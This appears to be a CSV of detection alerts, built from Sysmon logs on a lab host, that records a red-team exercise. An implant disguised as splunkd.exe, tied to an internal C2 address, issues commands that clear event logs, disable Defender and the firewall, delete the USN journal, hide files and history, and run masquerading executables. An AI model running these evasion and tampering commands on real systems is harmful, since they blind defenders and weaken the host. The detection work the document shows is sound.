C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.rtf.ps1 ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 2252 ¦ PGUID: E9F06A57-9545-694A-C502-000000002300 ¦ ParentPID: 8516 ¦ ParentPGUID: E9F06A57-9545-694A-C402-000000002300 ¦ Description: Windows Calculator ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=CFCA921BBAC5103BF369B2B1B604C13E,SHA256=81BD48985FA1753E9E2158A7CF969141EDDDBD050E976801BB477E24A2A06B2A,IMPHASH=1C9F3A396211B31FA9D65A8CE96B9BB4","CurrentDirectory: C:\Windows\System32\ ¦ FileVersion: 10.0.26100.1882 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: CALC.EXE ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:12:37.756","proc_creation_win_susp_double_extension.yml","b6ce0b2f-593b-5e1c-e137-d30b2974e30e","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:12:38.833 +01:00","Suspicious Double Extension File Execution","high","DESKTOP-G2OBL3D","Sysmon",1,"InitAccess","T1566.001","sysmon",172676,"Cmdline: C:\Users\student\AppData\Local\Temp\T1036.007_masquerading.pdf.exe ¦ Proc: C:\Users\student\AppData\Local\Temp\T1036.007_masquerading.pdf.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: cmd.exe /C copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.docx.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.pdf.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.ps1.exe /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.xls.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.xlsx.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.png.vbs /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.doc.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.pdf.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.rtf.ps1 /Y && %temp%\T1036.007_masquerading.docx.exe && %temp%\T1036.007_masquerading.pdf.exe && %temp%\T1036.007_masquerading.ps1.exe && %temp%\T1036.007_masquerading.xls.vbs && %temp%\T1036.007_masquerading.xlsx.vbs && %temp%\T1036.007_masquerading.png.vbs && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.doc.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.pdf.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.rtf.ps1 ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 9036 ¦ PGUID: E9F06A57-9546-694A-C702-000000002300 ¦ ParentPID: 8516 ¦ ParentPGUID: E9F06A57-9545-694A-C402-000000002300 ¦ Description: Windows Calculator ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=CFCA921BBAC5103BF369B2B1B604C13E,SHA256=81BD48985FA1753E9E2158A7CF969141EDDDBD050E976801BB477E24A2A06B2A,IMPHASH=1C9F3A396211B31FA9D65A8CE96B9BB4","CurrentDirectory: C:\Windows\System32\ ¦ FileVersion: 10.0.26100.1882 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: CALC.EXE ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:12:38.821","proc_creation_win_susp_double_extension.yml","b6ce0b2f-593b-5e1c-e137-d30b2974e30e","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:08:56.533 +01:00","Suspicious Eventlog Clearing or Configuration Change Activity","high","DESKTOP-G2OBL3D","Sysmon",1,"Evas","T1070.001 ¦ T1562.002","car.2016-04-002 ¦ sysmon",172649,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""Clear-Eventlog Security;Clear-Eventlog System;"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 8508 ¦ PGUID: E9F06A57-9468-694A-B902-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:08:56.521","proc_creation_win_susp_eventlog_clear.yml","c587d2e5-df4a-55b2-8617-db15b850b468","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:04:39.319 +01:00","Potentially Suspicious Execution From Parent Process In Public Folder","high","DESKTOP-G2OBL3D","Sysmon",1,"Evas ¦ Exec","T1564 ¦ T1059","sysmon",172629,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C Clear-History;Clear ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 6268 ¦ PGUID: E9F06A57-9367-694A-AB02-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:04:39.316","proc_creation_win_susp_execution_from_public_folder_as_parent.yml","e290d986-807f-5dff-cd59-aaf24e9d900a","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:05:15.346 +01:00","Potentially Suspicious Execution From Parent Process In Public Folder","high","DESKTOP-G2OBL3D","Sysmon",1,"Evas ¦ Exec","T1564 ¦ T1059","sysmon",172631,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""Set-PSReadlineOption -HistorySaveStyle SaveNothing"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 5240 ¦ PGUID: E9F06A57-938B-694A-AC02-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:05:15.337","proc_creation_win_susp_execution_from_public_folder_as_parent.yml","e290d986-807f-5dff-cd59-aaf24e9d900a","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:06:17.380 +01:00","Potentially Suspicious Execution From Parent Process In Public Folder","high","DESKTOP-G2OBL3D","Sysmon",1,"Evas ¦ Exec","T1564 ¦ T1059","sysmon",172633,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""Set-MpPreference -DisableIntrusionPreventionSystem $true;Set-MpPreference -DisableIOAVProtection $true;Set-MpPreference -DisableRealtimeMonitoring $true;Set-MpPreference -DisableScriptScanning $true;Set-MpPreference -EnableControlledFolderAccess Disabled;"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 2380 ¦ PGUID: E9F06A57-93C9-694A-AD02-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:06:17.370","proc_creation_win_susp_execution_from_public_folder_as_parent.yml","e290d986-807f-5dff-cd59-aaf24e9d900a","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:07:14.402 +01:00","Potentially Suspicious Execution From Parent Process In Public Folder","high","DESKTOP-G2OBL3D","Sysmon",1,"Evas ¦ Exec","T1564 ¦ T1059","sysmon",172635,"Cmdline: cmd.exe /C icacls ""C:\Users\Public\*"" /grant Everyone:F /T /C /Q ¦ Proc: C:\Windows\System32\cmd.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 1764 ¦ PGUID: E9F06A57-9402-694A-AF02-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows Command Processor ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=FE48494F2B5A9C452F12E9BBE93A6BE6,SHA256=746C77047FC973F7CA66F8AF28274A30E05F4BB1751EE8A2C6546D9DA48E1115,IMPHASH=EDEF5A2A98D730D4288FE684BA0B0E00","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.2454 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: Cmd.Exe ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:07:14.389","proc_creation_win_susp_execution_from_public_folder_as_parent.yml","e290d986-807f-5dff-cd59-aaf24e9d900a","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:07:52.437 +01:00","Potentially Suspicious Execution From Parent Process In Public Folder","high","DESKTOP-G2OBL3D","Sysmon",1,"Evas ¦ Exec","T1564 ¦ T1059","sysmon",172637,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""Copy-Item C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe C:\Windows\Temp\debug.exe;C:\Windows\Temp\debug.exe get-process >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe get-localgroup >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe get-localuser >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe Get-ItemProperty Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion >> C:\Windows\temp\debug.log;"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 4400 ¦ PGUID: E9F06A57-9428-694A-B302-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:07:52.428","proc_creation_win_susp_execution_from_public_folder_as_parent.yml","e290d986-807f-5dff-cd59-aaf24e9d900a","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:08:56.533 +01:00","Potentially Suspicious Execution From Parent Process In Public Folder","high","DESKTOP-G2OBL3D","Sysmon",1,"Evas ¦ Exec","T1564 ¦ T1059","sysmon",172649,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""Clear-Eventlog Security;Clear-Eventlog System;"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 8508 ¦ PGUID: E9F06A57-9468-694A-B902-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:08:56.521","proc_creation_win_susp_execution_from_public_folder_as_parent.yml","e290d986-807f-5dff-cd59-aaf24e9d900a","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:09:33.546 +01:00","Potentially Suspicious Execution From Parent Process In Public Folder","high","DESKTOP-G2OBL3D","Sysmon",1,"Evas ¦ Exec","T1564 ¦ T1059","sysmon",172651,"Cmdline: cmd.exe /C netsh advfirewall set currentprofile state off ¦ Proc: C:\Windows\System32\cmd.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 1668 ¦ PGUID: E9F06A57-948D-694A-BA02-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows Command Processor ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=FE48494F2B5A9C452F12E9BBE93A6BE6,SHA256=746C77047FC973F7CA66F8AF28274A30E05F4BB1751EE8A2C6546D9DA48E1115,IMPHASH=EDEF5A2A98D730D4288FE684BA0B0E00","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.2454 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: Cmd.Exe ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:09:33.537","proc_creation_win_susp_execution_from_public_folder_as_parent.yml","e290d986-807f-5dff-cd59-aaf24e9d900a","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:10:31.609 +01:00","Potentially Suspicious Execution From Parent Process In Public Folder","high","DESKTOP-G2OBL3D","Sysmon",1,"Evas ¦ Exec","T1564 ¦ T1059","sysmon",172658,"Cmdline: cmd.exe /C attrib.exe +h %%temp%%\T1564.001.txt ¦ Proc: C:\Windows\System32\cmd.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 3564 ¦ PGUID: E9F06A57-94C7-694A-C102-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows Command Processor ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=FE48494F2B5A9C452F12E9BBE93A6BE6,SHA256=746C77047FC973F7CA66F8AF28274A30E05F4BB1751EE8A2C6546D9DA48E1115,IMPHASH=EDEF5A2A98D730D4288FE684BA0B0E00","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.2454 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: Cmd.Exe ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:10:31.583","proc_creation_win_susp_execution_from_public_folder_as_parent.yml","e290d986-807f-5dff-cd59-aaf24e9d900a","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:11:33.616 +01:00","Potentially Suspicious Execution From Parent Process In Public Folder","high","DESKTOP-G2OBL3D","Sysmon",1,"Evas ¦ Exec","T1564 ¦ T1059","sysmon",172660,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope LocalMachine"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 4932 ¦ PGUID: E9F06A57-9505-694A-C302-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:11:33.610","proc_creation_win_susp_execution_from_public_folder_as_parent.yml","e290d986-807f-5dff-cd59-aaf24e9d900a","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:12:37.707 +01:00","Potentially Suspicious Execution From Parent Process In Public Folder","high","DESKTOP-G2OBL3D","Sysmon",1,"Evas ¦ Exec","T1564 ¦ T1059","sysmon",172664,"Cmdline: cmd.exe /C copy ""C:\Windows\System32\calc.exe"" %%temp%%\T1036.007_masquerading.docx.exe /Y && copy ""C:\Windows\System32\calc.exe"" %%temp%%\T1036.007_masquerading.pdf.exe /Y && copy ""C:\Windows\System32\calc.exe"" %%temp%%\T1036.007_masquerading.ps1.exe /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %%temp%%\T1036.007_masquerading.xls.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %%temp%%\T1036.007_masquerading.xlsx.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %%temp%%\T1036.007_masquerading.png.vbs /Y && copy ""107417_T1036.007_masquerading.ps1"" %%temp%%\T1036.007_masquerading.doc.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %%temp%%\T1036.007_masquerading.pdf.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %%temp%%\T1036.007_masquerading.rtf.ps1 /Y && %%temp%%\T1036.007_masquerading.docx.exe && %%temp%%\T1036.007_masquerading.pdf.exe && %%temp%%\T1036.007_masquerading.ps1.exe && %%temp%%\T1036.007_masquerading.xls.vbs && %%temp%%\T1036.007_masquerading.xlsx.vbs && %%temp%%\T1036.007_masquerading.png.vbs && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %%temp%%\T1036.007_masquerading.doc.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %%temp%%\T1036.007_masquerading.pdf.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %%temp%%\T1036.007_masquerading.rtf.ps1 ¦ Proc: C:\Windows\System32\cmd.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 8516 ¦ PGUID: E9F06A57-9545-694A-C402-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows Command Processor ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=FE48494F2B5A9C452F12E9BBE93A6BE6,SHA256=746C77047FC973F7CA66F8AF28274A30E05F4BB1751EE8A2C6546D9DA48E1115,IMPHASH=EDEF5A2A98D730D4288FE684BA0B0E00","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.2454 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: Cmd.Exe ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:12:37.680","proc_creation_win_susp_execution_from_public_folder_as_parent.yml","e290d986-807f-5dff-cd59-aaf24e9d900a","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:13:20.664 +01:00","Potentially Suspicious Execution From Parent Process In Public Folder","high","DESKTOP-G2OBL3D","Sysmon",1,"Evas ¦ Exec","T1564 ¦ T1059","sysmon",172689,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""Start-Process powershell.exe -WindowStyle hidden calc.exe"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 4192 ¦ PGUID: E9F06A57-9570-694A-D202-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:13:20.656","proc_creation_win_susp_execution_from_public_folder_as_parent.yml","e290d986-807f-5dff-cd59-aaf24e9d900a","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:13:57.694 +01:00","Potentially Suspicious Execution From Parent Process In Public Folder","high","DESKTOP-G2OBL3D","Sysmon",1,"Evas ¦ Exec","T1564 ¦ T1059","sysmon",172695,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""copy \""1db90b_T1036.003.exe\"" ($env:TEMP + \""\svchost.exe\""); try { $myT1036_003 = (Start-Process -PassThru -FilePath ($env:TEMP + \""\svchost.exe\"")).Id }; catch { $_; exit $_.Exception.HResult}; Stop-Process -ID $myT1036_003"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 4408 ¦ PGUID: E9F06A57-9595-694A-D702-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:13:57.692","proc_creation_win_susp_execution_from_public_folder_as_parent.yml","e290d986-807f-5dff-cd59-aaf24e9d900a","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:14:47.716 +01:00","Potentially Suspicious Execution From Parent Process In Public Folder","high","DESKTOP-G2OBL3D","Sysmon",1,"Evas ¦ Exec","T1564 ¦ T1059","sysmon",172698,"Cmdline: cmd.exe /C fsutil usn deletejournal /D C: ¦ Proc: C:\Windows\System32\cmd.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 2876 ¦ PGUID: E9F06A57-95C7-694A-D902-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows Command Processor ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=FE48494F2B5A9C452F12E9BBE93A6BE6,SHA256=746C77047FC973F7CA66F8AF28274A30E05F4BB1751EE8A2C6546D9DA48E1115,IMPHASH=EDEF5A2A98D730D4288FE684BA0B0E00","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.2454 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: Cmd.Exe ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:14:47.708","proc_creation_win_susp_execution_from_public_folder_as_parent.yml","e290d986-807f-5dff-cd59-aaf24e9d900a","C:\Tools\Logs\mc_defense.evtx"
